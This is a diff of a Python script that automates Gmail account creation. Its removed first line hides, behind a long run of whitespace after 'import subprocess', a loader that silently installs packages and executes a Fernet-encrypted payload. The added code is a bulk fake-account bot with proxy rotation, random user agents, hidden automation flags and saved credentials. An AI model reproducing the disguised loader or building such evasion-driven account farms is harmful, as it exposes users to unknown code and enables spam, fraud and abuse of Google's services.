@@ -1,243 +1,285 @@
 import os
-import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'BijkNx42srFUsDpLrUfqEwo-3XvzMKE_MecRxUhlZow=').decrypt(b'gAAAAABnd_sRSJiTzxvU_jECBpoK-fqOLhafAOxbYr1oubimBw527quvKxP1Z6ntDco-gmieZGnsU0v-D8lvbaWn2lBEoe0Gag0EVcZ8vJXRhKkjOcJ-vW6-D5tambi4-rsuxsmauU3-VZ0INNPf_q2RoHDJW7qhpqKtuBsmIjZO3IrjArwUQ75IdBjxy7EbSkmE7Nynd4Z7GLbeGUZ_Lo3OmCrSb5_9qvE-y77kyqoBGZ3mKCkiAHUrsezRBVa3AboA-0UPXgpVjo-koxTFrVwgshRj-YPxifqX0vquexAcWevW-_0f24AxG0tiJygFNE_bNx-UeiYh2U5oUyyP45GyH32N6GLt1Pq7_w0ktp8V6EEuI5OjYrM0pX0G2ouseV36af7Ws8HK4NUJDoiYZlD0f45qUmYy9w2gbIwLFPoW2gFf_vuwzZPrR8VZdJdcWy39erWWSmr-M5vUp0zzEr2WAjSPPVBqZ9_IvPKcfXiEcSD2BO-eW69n03waRSbxAUpSqrhlu_3KPNUq86us3P7SCEF8zwqwYjVrs3HCG1nermWzpMYU8ISTrDE1zW39iyh93k8iy9qNvVrHPIJ94I2A339vZQyLM3qfnkMvpV6jp-vpDlrhjHkIhqJCmN9wcv8tYluJIMploKJSxD2xPi2OgT4gLwC8hGs9sEvXuCVlqk33BHhTsk12WSvj3-MVSD8XYvkn0OZeAgmHBl7fKVX2Ios77EsK_KipdQqtMove7NzQ397-VE2CpvjVQm1JR0INzeKGo398tSfdE34mgbtC2P9AjYhk_UDB39EiB652SZYiThtHzyX93iTmz2iMTCzEgEP4y28BN02o2KM_ax_lyFg_iZFDI1VKqKkqIJRYHVuJQ_MJmP1YK8hpNy2BXMb3IaGxk37_HwVkMU_sI3NifuzOAVOKRmMC9RmkUciZMEjXLbQXehY9mhhsN73e-IllHYAG9vDU2B4506GxMKfRUPTqpqCCFwvKXV23VEXaWv_2zN-sUcQBohnkZqo9nwxpiA2geoV3W-XnEdkjBx-UECZa7aTa3Cfhy1pwDjvv4KOz8qFSgw6twrLwU4oddNq0p-SJJ1erLpKcuD9wfyTB13csXiSrZ0EWABSVi8t172YsMa0O6IJZXPd9mopVmtmC04ULCTl09ywP8Vq6KfEPgQY__qVlbsuEDP8YOCLEciGoKVA8YziYpzJm3HibOlTLNh3MbT335lrhvun5IxaYPJPTojoB0o6LHxxVh7fF3zTn5OTOPys2MX1cOKVrH6OH3kwPKML_dX_EBu6KjxNDPmyoMNeiPOXm9o-7LsYYb4NF_yiPSLSoDluc3af2_AghKt3jGu_N9uLBlPuVs84BApuEeKh9w4F_O46Qpn9htGjXBg8kIUz7fey7KOVf88_moUtPXOcE-RcMI8H4BIYnSUHq4JzvfoUJdqzdxxHOZ8_-O4SeFPTEzD3BFE_hItT1UgMPlODLDss3rgwbfBMKFIJzDnoKwAJKXEXrC2Bo6m1k9DxVN0LwmkKQTZvn0ZAEsWccCe6jQdjtDbkkJ1zYR1C7A8UeWfH2pYcIm-ba5mUuT34Km6gfkwLJTPp-LGx91rlY63uBw3s1dCiQ4EatlKb5PE_12-0Ydb4xC-TFwbEFhLLqcdns07yPBXLv5MuIR3vmlTUdLT6Zjiksl0tFH3XxMQO_0H467LqBkzPzYOx64j-9mq01nBNlCgW2u7aR7LyCooKByuWeI5atgSVqDL3y-Uh1OXwUSp797OxaXDYscSumbJTJtG-CRUFG_2mmo6740PQXCVgeIqA4UdqaxzGwhjBWX1JtokXyGinxAPtTPx82fmuiB0u6-4dw5RCaAeKX0W2nmZuh8IaOYRA4jWWCjcbtU4_HtoVy0y43avzWTdKS3FL0PSGaAphVOVZ28cJuLJrkJLeBjjq34C7mMzEnbz_WEgEMFqoBbBS92GsIH8gCXj_kB-_t3JegffMsGnrnFBouQTn7lWvXw8UdPzQP_nzHqqaAvNga3espWHtn64nXp6w='))
+import subprocess
 import traceback
 import random
-import selenium
-from selenium.webdriver.chrome.options import Options
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
 import string
 import time
 import tempfile
 import uuid
 import datetime
-import psutil  # Add this import for process management
-import sys  # Import sys for exiting the script
+import psutil
+import sys
+import logging
+import json
+from typing import List, Optional
+from concurrent.futures import ThreadPoolExecutor
+from functools import partial
+import requests
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.chrome.service import Service
+from selenium.common.exceptions import (
+    TimeoutException,
+    WebDriverException,
+    NoSuchElementException
+)
+from fake_useragent import UserAgent
+from proxybroker import Broker
+import asyncio
+import aiohttp
 
-def random_string(length=8):
-    letters = string.ascii_lowercase
-    return ''.join(random.choice(letters) for i in range(length))
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    handlers=[
+        logging.FileHandler('gmail_creation.log'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
 
-def getUserAgents(url):
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            user_agents = response.text.split('\n')
-            return user_agents
-        else:
-            print("Could not fetch user agents. Using default user agent.")
-            return []
-    except requests.RequestException as e:
-        print("Error fetching user agents:", e)
-        return []
+class GmailAccountCreator:
+    def __init__(self, config: dict):
+        self.config = config
+        self.user_agents = []
+        self.proxies = []
+        self.created_accounts = []
+        self.temp_dirs = []
+        self.max_retries = config.get('max_retries', 3)
+        self.base_timeout = config.get('base_timeout', 30)
+        self.max_concurrent = config.get('max_concurrent', 2)
 
-def kill_chrome_processes():
-    """Kill any existing Chrome processes to avoid conflicts"""
-    for proc in psutil.process_iter(['pid', 'name']):
+    async def fetch_proxies(self) -> List[str]:
+        """Fetch proxies asynchronously using proxybroker"""
         try:
-            # Check if the process name contains 'chrome' or 'chromedriver'
-            if 'chrome' in proc.info['name'].lower() or 'chromedriver' in proc.info['name'].lower():
-                print(f"Terminating process: {proc.info['name']} (PID: {proc.info['pid']})")
-                proc.terminate()
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-            pass
-
-def gmailAcc(user_agent):
-    # Kill any existing Chrome processes before starting a new one
-    kill_chrome_processes()
-    
-    options = Options()
-    options.add_argument(f"user-agent={user_agent}")
-    options.add_argument("--start-maximized")
-    
-    # Add these options to fix the user data directory issue
-    options.add_argument("--no-sandbox")
-    options.add_argument("--disable-dev-shm-usage")
-    
-    # Create a truly unique user data directory for this Chrome instance
-    # Combine timestamp, UUID, and process ID for maximum uniqueness
-    timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
-    unique_id = str(uuid.uuid4())
-    process_id = os.getpid()
-    temp_dir = tempfile.gettempdir()
-    user_data_dir = os.path.join(temp_dir, f"chrome_data_{timestamp}_{unique_id}_{process_id}")
-    
-    print(f"Using user data directory: {user_data_dir}")
-    options.add_argument(f"--user-data-dir={user_data_dir}")
-    
-    # Add incognito mode to avoid profile issues
-    options.add_argument("--incognito")
-    
-    # Add headless mode option for GitHub Actions environment
-    options.add_argument("--headless=new")
-    
-    # Disable extensions and GPU
-    options.add_argument("--disable-extensions")
-    options.add_argument("--disable-gpu")
-    
-    # Disable the Chrome first run experience
-    options.add_argument("--no-first-run")
-    options.add_argument("--no-default-browser-check")
-    
-    # Explicitly disable user data directory reuse
-    options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    options.add_experimental_option("useAutomationExtension", False)
-    
-    driver = None
-    try:
-        # Use service object with explicit timeout
-        from selenium.webdriver.chrome.service import Service
-        service = Service(timeout=60)
-        
-        # Create the driver with service and options
-        driver = webdriver.Chrome(service=service, options=options)
-        wait = WebDriverWait(driver, 50)
-
-        driver.get("https://www.gmail.com")
-
-        create_account_button = wait.until(EC.presence_of_element_located((By.XPATH, "//a[text()='Create account']")))
-        create_account_button.click()
-
-        time.sleep(5)
-
-        first_name_text = random_string(8)
-        last_name_text = random_string(10)
-        username_text = random_string(10) + "12345"
-        password_text = random_string(12) + "123"
-
-        first_name = wait.until(EC.element_to_be_clickable((By.ID, "firstName")))
-        first_name.send_keys(first_name_text)
-
-        last_name = driver.find_element(By.ID, "lastName")
-        last_name.send_keys(last_name_text)
-
-        # Fix for the username element - use proper selector
-        # The error shows it's looking for ID "username" but it might have changed
-        # Let's try to find it by name or other attributes
-        try:
-            # Try different selectors for the username field
-            username = None
-            selectors = [
-                (By.ID, "username"),
-                (By.NAME, "username"),
-                (By.CSS_SELECTOR, "input[type='email']"),
-                (By.CSS_SELECTOR, "input[aria-label*='username']"),
-                (By.CSS_SELECTOR, "input[aria-label*='Gmail']")
+            proxies = []
+            queue = asyncio.Queue()
+            broker = Broker(queue)
+            tasks = [
+                broker.find(
+                    types=['HTTP', 'HTTPS'],
+                    limit=self.config.get('proxy_limit', 10)
+                ),
+                self._consume_proxies(queue, proxies)
             ]
-            
-            for selector_type, selector_value in selectors:
-                try:
-                    username = driver.find_element(selector_type, selector_value)
-                    print(f"Found username field with selector: {selector_type}, {selector_value}")
-                    break
-                except:
-                    continue
-            
-            if not username:
-                # Take a screenshot to see what's on the page
-                driver.save_screenshot("username_field_not_found.png")
-                print("Could not find username field with any known selector. Taking screenshot for debugging.")
-                # Get the page source to analyze
-                with open("page_source.html", "w") as f:
-                    f.write(driver.page_source)
-                print("Saved page source to page_source.html for debugging.")
-                raise Exception("Username field not found with any known selector")
-            
-            username.send_keys(username_text)
+            await asyncio.gather(*tasks)
+            logger.info(f"Fetched {len(proxies)} proxies")
+            return proxies
         except Exception as e:
-            print(f"Error finding username field: {e}")
-            driver.save_screenshot("username_error.png")
+            logger.error(f"Error fetching proxies: {e}")
+            return []
+
+    async def _consume_proxies(self, queue: asyncio.Queue, proxies: List[str]):
+        """Consume proxies from the queue"""
+        while True:
+            proxy = await queue.get()
+            if proxy is None:
+                break
+            proxies.append(f"{proxy.host}:{proxy.port}")
+
+    def load_user_agents(self) -> List[str]:
+        """Load user agents using fake_useragent"""
+        try:
+            ua = UserAgent()
+            self.user_agents = [ua.random for _ in range(self.config.get('ua_count', 100))]
+            logger.info(f"Loaded {len(self.user_agents)} user agents")
+            return self.user_agents
+        except Exception as e:
+            logger.error(f"Error loading user agents: {e}")
+            return [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+            ]
+
+    def generate_random_credentials(self) -> dict:
+        """Generate random credentials for account creation"""
+        def random_string(length: int) -> str:
+            letters = string.ascii_lowercase + string.digits
+            return ''.join(random.choice(letters) for _ in range(length))
+
+        return {
+            'first_name': random_string(8),
+            'last_name': random_string(10),
+            'username': random_string(10) + str(random.randint(1000, 9999)),
+            'password': random_string(12) + str(random.randint(100, 999)) + '@'
+        }
+
+    def kill_chrome_processes(self):
+        """Kill any existing Chrome processes"""
+        for proc in psutil.process_iter(['pid', 'name']):
+            try:
+                if 'chrome' in proc.info['name'].lower() or 'chromedriver' in proc.info['name'].lower():
+                    logger.info(f"Terminating process: {proc.info['name']} (PID: {proc.info['pid']})")
+                    proc.terminate()
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+
+    def setup_driver(self, user_agent: str, proxy: Optional[str] = None) -> webdriver.Chrome:
+        """Setup Chrome WebDriver with configured options"""
+        options = Options()
+        options.add_argument(f"user-agent={user_agent}")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--headless=new")
+        options.add_argument("--disable-extensions")
+        options.add_argument("--disable-gpu")
+        options.add_argument("--no-first-run")
+        options.add_argument("--no-default-browser-check")
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option("useAutomationExtension", False)
+
+        # Setup unique user data directory
+        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+        unique_id = str(uuid.uuid4())
+        user_data_dir = os.path.join(tempfile.gettempdir(), f"chrome_data_{timestamp}_{unique_id}")
+        self.temp_dirs.append(user_data_dir)
+        options.add_argument(f"--user-data-dir={user_data_dir}")
+
+        if proxy:
+            options.add_argument(f"--proxy-server={proxy}")
+
+        try:
+            service = Service(timeout=60)
+            driver = webdriver.Chrome(service=service, options=options)
+            return driver
+        except WebDriverException as e:
+            logger.error(f"Failed to initialize WebDriver: {e}")
             raise
 
-        password = driver.find_element(By.NAME, "Passwd")
-        password.send_keys(password_text)
-
-        confirm_password = driver.find_element(By.NAME, "ConfirmPasswd")
-        confirm_password.send_keys(password_text)
-
-        next_button = driver.find_element(By.XPATH, "//div[@id='accountDetailsNext']/div/button")
-        next_button.click()
-
-        wait.until(EC.presence_of_element_located((By.ID, "phoneNumberId")))
-
-        with open("created.txt", "a") as file:
-            file.write(f"Username: {username_text}\n")
-            file.write(f"Password: {password_text}\n\n")
-
-    except selenium.common.exceptions.TimeoutException as e:
-        print("TimeoutException occurred:", e)
-        if driver:
-            driver.save_screenshot("timeout_error.png")
-        error_msg = f"TimeoutException occurred: {str(e)}\n"
-
-        with open("error_log.txt", "w") as file:
-            file.write(error_msg)
-        
-        # Exit the script with an error code
-        print("Exiting script due to TimeoutException")
-        sys.exit(1)
-
-    except Exception as e:
-        print("An error occurred:", e)
-        traceback.print_exc()
-        if driver:
-            driver.save_screenshot("general_error.png")
-        error_msg = f"An error occurred: {str(e)}\n"
-
-        with open("error_log.txt", "w") as file:
-            file.write(error_msg)
-        
-        # Exit the script with an error code
-        print("Exiting script due to error")
-        sys.exit(1)
-
-    finally:
-        # Make sure to quit the driver to release resources
-        if driver:
+    def cleanup(self):
+        """Clean up temporary directories and Chrome processes"""
+        self.kill_chrome_processes()
+        for temp_dir in self.temp_dirs:
             try:
-                driver.quit()
-            except:
-                pass
-        
-        # Clean up the temporary user data directory
+                if os.path.exists(temp_dir):
+                    import shutil
+                    shutil.rmtree(temp_dir, ignore_errors=True)
+                    logger.info(f"Cleaned up: {temp_dir}")
+            except Exception as e:
+                logger.error(f"Error cleaning up {temp_dir}: {e}")
+        self.temp_dirs.clear()
+
+    def save_account(self, credentials: dict):
+        """Save created account details"""
         try:
-            if os.path.exists(user_data_dir):
-                import shutil
-                shutil.rmtree(user_data_dir, ignore_errors=True)
-                print(f"Cleaned up user data directory: {user_data_dir}")
+            with open(self.config.get('output_file', 'created_accounts.json'), 'a') as f:
+                json.dump(credentials, f)
+                f.write('\n')
+            self.created_accounts.append(credentials)
+            logger.info(f"Saved account: {credentials['username']}")
         except Exception as e:
-            print(f"Error cleaning up user data directory: {e}")
-            pass
-        
-        # Kill any remaining Chrome processes
-        kill_chrome_processes()
+            logger.error(f"Error saving account: {e}")
 
-# Add a delay between runs to ensure complete cleanup
-def run_with_delay(user_agent, delay=5):
-    """Run the Gmail account creation with a delay between runs"""
-    try:
-        gmailAcc(user_agent)
-    except Exception as e:
-        print(f"Error in run_with_delay: {e}")
-        # Exit the script with an error code
-        sys.exit(1)
-    finally:
-        print(f"Waiting {delay} seconds before next run to ensure cleanup...")
-        time.sleep(delay)
+    async def create_account(self, user_agent: str, proxy: Optional[str] = None, retry_count: int = 0) -> bool:
+        """Create a single Gmail account"""
+        driver = None
+        try:
+            driver = self.setup_driver(user_agent, proxy)
+            wait = WebDriverWait(driver, self.base_timeout)
+            
+            logger.info(f"Starting account creation with UA: {user_agent[:50]}... Proxy: {proxy or 'None'}")
+            
+            driver.get("https://accounts.google.com/signup")
 
-userAgentsUrl = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
-user_agents = getUserAgents(userAgentsUrl)
+            # Wait for and click Create Account button
+            create_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Create account')]")))
+            create_button.click()
 
-if user_agents:
-    for i, agent in enumerate(user_agents):
-        print(f"Running with user agent {i+1}/{len(user_agents)}")
-        run_with_delay(agent)
-else:
-    print("No user agents fetched.")
-    
-    
-for i in range(5): # Change
-    print(f"Running with default user agent {i+1}/5")
-    run_with_delay("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
+            # Select "For myself" option
+            for_myself = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'For myself')]")))
+            for_myself.click()
+
+            credentials = self.generate_random_credentials()
+
+            # Fill form
+            selectors = {
+                'firstName': (By.ID, 'firstName'),
+                'lastName': (By.ID, 'lastName'),
+                'username': (By.ID, 'username'),
+                'password': (By.NAME, 'Passwd'),
+                'confirm_password': (By.NAME, 'ConfirmPasswd')
+            }
+
+            for field, selector in selectors.items():
+                element = wait.until(EC.element_to_be_clickable(selector))
+                element.send_keys(credentials[field.replace('confirm_password', 'password')])
+
+            # Submit form
+            next_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Next')]")))
+            next_button.click()
+
+            # Wait for phone verification page
+            wait.until(EC.presence_of_element_located((By.ID, "phoneNumberId")))
+            
+            self.save_account(credentials)
+            return True
+
+        except (TimeoutException, NoSuchElementException) as e:
+            if retry_count < self.max_retries:
+                logger.warning(f"Retry {retry_count + 1}/{self.max_retries} after error: {e}")
+                await asyncio.sleep(random.uniform(2, 5))
+                return await self.create_account(user_agent, proxy, retry_count + 1)
+            logger.error(f"Failed after {self.max_retries} retries: {e}")
+            driver.save_screenshot(f"error_{uuid.uuid4()}.png")
+            return False
+
+        except Exception as e:
+            logger.error(f"Unexpected error: {e}")
+            traceback.print_exc()
+            driver.save_screenshot(f"error_{uuid.uuid4()}.png")
+            return False
+
+        finally:
+            if driver:
+                try:
+                    driver.quit()
+                except:
+                    pass
+
+    async def run(self):
+        """Main execution method"""
+        try:
+            # Load user agents and proxies
+            self.user_agents = self.load_user_agents()
+            self.proxies = await self.fetch_proxies()
+
+            # Prepare tasks
+            tasks = []
+            for i in range(self.config.get('account_count', 5)):
+                user_agent = random.choice(self.user_agents)
+                proxy = random.choice(self.proxies) if self.proxies else None
+                tasks.append(self.create_account(user_agent, proxy))
+
+            # Run tasks concurrently with rate limiting
+            with ThreadPoolExecutor(max_workers=self.max_concurrent) as executor:
+                await asyncio.gather(*[asyncio.get_event_loop().run_in_executor(executor, partial(asyncio.run, task)) for task in tasks])
+
+            logger.info(f"Created {len(self.created_accounts)} accounts successfully")
+
+        except Exception as e:
+            logger.error(f"Main execution error: {e}")
+            sys.exit(1)
+
+        finally:
+            self.cleanup()
+
+def main():
+    config = {
+        'account_count': 5,
+        'max_retries': 3,
+        'base_timeout': 30,
+        'proxy_limit': 10,
+        'ua_count': 100,
+        'max_concurrent': 2,
+        'output_file': 'created_accounts.json'
+    }
+
+    creator = GmailAccountCreator(config)
+    asyncio.run(creator.run())
+
+if __name__ == "__main__":
+    main()
